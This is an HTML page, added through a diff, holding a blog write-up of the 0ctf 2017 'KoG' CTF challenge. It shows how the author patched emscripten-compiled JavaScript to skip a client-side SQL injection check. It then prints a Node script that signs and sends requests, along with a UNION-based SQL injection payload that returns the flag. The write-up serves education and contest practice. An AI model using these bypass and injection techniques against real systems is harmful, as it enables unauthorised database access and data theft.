@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>0ctf 2017 - KoG | Born to Learn</title>
+<link rel="stylesheet" href="https://jiulongw.github.io/css/style.css">
+<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.6.0/styles/github.min.css">
+
+
+<section class="section">
+  <div class="container">
+    <nav class="nav">
+      <div class="nav-left">
+        <a class="nav-item" href="https://jiulongw.github.io"><h1 class="title is-4">Born to Learn</h1></a>
+      </div>
+      <div class="nav-right">
+        <nav class="nav-item level is-mobile">
+          
+          <a class="level-item" href="https://github.com/jiulongw">
+            <span class="icon">
+              <i class="fa fa-github"></i>
+            </span>
+          </a>
+          
+          <a class="level-item" href="https://twitter.com/jiulongw">
+            <span class="icon">
+              <i class="fa fa-twitter"></i>
+            </span>
+          </a>
+          
+          <a class="level-item" href="/index.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+          </a>
+          
+        </nav>
+      </div>
+    </nav>
+  </div>
+</section>
+
+<section class="section">
+  <div class="container">
+    <div class="subtitle is-6 is-pulled-right">
+      
+    </div>
+    <h2 class="subtitle is-6">March 19, 2017</h2>
+    <h1 class="title">0ctf 2017 - KoG</h1>
+    <div class="content">
+      <p>Do you know you can run your C++ program in browser?</p>
+
+<p></p>
+
+<h1 id="problem">Problem</h1>
+
+<blockquote>
+<p>King of Glory is a funny game. Our website has a list of players.<br />
+<a href="http://202.120.7.213:11181">http://202.120.7.213:11181</a></p>
+</blockquote>
+
+<p>Hitting the given URL doesn&rsquo;t show anything interesting, but the page source code indicating it was looking for <code>id</code>
+parameter.  So try it with <code>?id=1</code>, we can see it made a request to api.php with some interesting parameters.</p>
+
+<pre><code>http://202.120.7.213:11181/api.php?id=1&amp;hash=035c6d4adf335c31e884796a11a2590f&amp;time=1489983725
+</code></pre>
+
+<p>Ha, looks like it hashes <code>id</code> using current time as salt and use that hash to validate at server side for integrity.
+If you try to put some SQLi stuff in <code>id</code>, it will reject hash generation, which happens in client side.
+So the goal is pretty straightforward: bypass client side SQLi detection, generate hash and inject the server!</p>
+
+<p>Now it comes the hard part: the <a href="/0ctf-2017/functionn.js">hash generation code</a> is the most complex Javascript code I have ever seen.  Tracing
+into <code>Module.main</code>, I see memory allocators, function maps, and even function name that suggests system calls.
+What The Heck!</p>
+
+<p>Googling around I figured it out: it was compiled from C/C++, using <a href="http://kripken.github.io/emscripten-site">emscripten</a>.</p>
+
+<blockquote>
+<p>Emscripten is an LLVM-based project that compiles C and C++ into highly-optimizable JavaScript in asm.js format.
+This lets you run C and C++ on the web at near-native speed, without plugins.</p>
+</blockquote>
+
+<p>The bad news, there is little, if not none, tools to reverse engineer generated Javascript code.</p>
+
+<p>The good news, it is still plain text, far better than ELF binary. It is easy to inject tracing code, run it with and
+without SQLi characters and compare the call sequence to find out where to apply patches.</p>
+
+<p>The function in question was <code>__Z10user_inputNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEE</code>. After
+commenting out following two if blocks, it generates hash for any input.</p>
+
+<pre><code class="language-javascript">if (!($13)) {
+ ;HEAP32[$agg$result&gt;&gt;2]=HEAP32[$s&gt;&gt;2]|0;HEAP32[$agg$result+4&gt;&gt;2]=HEAP32[$s+4&gt;&gt;2]|0;HEAP32[$agg$result+8&gt;&gt;2]=HEAP32[$s+8&gt;&gt;2]|0;
+ ;HEAP32[$s&gt;&gt;2]=0|0;HEAP32[$s+4&gt;&gt;2]=0|0;HEAP32[$s+8&gt;&gt;2]=0|0;
+ __ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEED2Ev($te);
+ __ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEED2Ev($s);
+ STACKTOP = sp;return;
+}
+</code></pre>
+
+<pre><code class="language-javascript">if ((label|0) == 12) {
+ ;HEAP32[$agg$result&gt;&gt;2]=HEAP32[$s&gt;&gt;2]|0;HEAP32[$agg$result+4&gt;&gt;2]=HEAP32[$s+4&gt;&gt;2]|0;HEAP32[$agg$result+8&gt;&gt;2]=HEAP32[$s+8&gt;&gt;2]|0;
+ ;HEAP32[$s&gt;&gt;2]=0|0;HEAP32[$s+4&gt;&gt;2]=0|0;HEAP32[$s+8&gt;&gt;2]=0|0;
+ __ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEED2Ev($te);
+ __ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEED2Ev($s);
+ STACKTOP = sp;return;
+}
+</code></pre>
+
+<p>Now it becomes a simple SQLi task.  First use <code>order by</code> trick to find out number of columns in the <code>select</code> statement.
+Then query <code>information_schema.tables</code> and <code>information_schema.columns</code> to find table and column in question.</p>
+
+<p>It is handy to write a simple <code>main.js</code> that does the hash and curl so no need to copy-paste around.</p>
+
+<pre><code class="language-javascript">var Module = require('./functionn.js');
+
+var q = process.argv[2];
+var hash = Module.main(q).split('|');
+
+var req = 'http://202.120.7.213:11181/api.php?id=' + encodeURI(q) + '&amp;hash=' + hash[0] + '&amp;time=' + hash[1]
+console.log(req);
+
+var spawn = require('child_process').spawn;
+var curl = spawn('curl', [req]);
+
+curl.stdout.on('data', (data) =&gt; {
+  console.log(`response: ${data}`);
+});
+</code></pre>
+
+<pre><code>$ node main.js &quot;1 union all select 1,hey from fl4g&quot;
+http://202.120.7.213:11181/api.php?id=1%20union%20all%20select%201,hey%20from%20fl4g&amp;hash=c2f05acaf2f91ba81b8c9b3ce2304da7&amp;time=1489882992
+response: EaseSingle Qinflag{emScripten_is_Cut3_right?}
+</code></pre>
+    </div>
+  </div>
+</section>
+
+<section class="section">
+  <div class="container">
+    <aside><div id="disqus_thread"></div></aside>
+    <script type="text/javascript">
+      var disqus_shortname = 'jiulongw';
+      (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+
+
+<section class="section">
+  <div class="container has-text-centered">
+    <p>&copy; <a href="https://jiulongw.github.io">jiulongw</a> 2016</p>
+  </div>
+</section>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.6.0/highlight.min.js"></script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.6.0/languages/ruby.min.js"></script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.6.0/languages/bash.min.js"></script>
+
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+<script>
+window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+ga('create', 'UA-86115491-1', 'auto');
+ga('send', 'pageview');
+</script>
+<script async src='//www.google-analytics.com/analytics.js'></script>
+
+
+
